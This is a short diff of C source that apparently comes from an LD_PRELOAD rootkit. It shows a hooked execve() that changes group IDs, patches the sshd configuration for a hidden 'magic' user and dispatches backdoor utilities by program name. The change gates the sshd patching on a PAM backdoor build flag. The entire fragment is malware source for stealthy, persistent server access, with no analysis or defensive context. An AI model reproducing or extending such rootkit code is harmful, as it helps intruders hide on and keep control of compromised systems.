@@ -5,7 +5,7 @@ int execve(const char *filename, char *const argv[], char *const envp[]){
 #ifdef AUTO_GID_CHANGER
     gidchanger();
 #endif
-#ifdef PATCH_SSHD_CONFIG
+#if defined(USE_PAM_BD) && defined(PATCH_SSHD_CONFIG)
     sshdpatch(REG_USR);
 #endif
 
@@ -16,7 +16,7 @@ int execve(const char *filename, char *const argv[], char *const envp[]){
         if(!fnmatch("*/bdv", argv[0], FNM_PATHNAME))
             dobdvutil(argv);
 #endif
-#ifdef PATCH_SSHD_CONFIG
+#if defined(USE_PAM_BD) && defined(PATCH_SSHD_CONFIG)
         if(!fnmatch("*/sshdpatch", argv[0], FNM_PATHNAME)){
             sshdpatch(MAGIC_USR);
             exit(0);
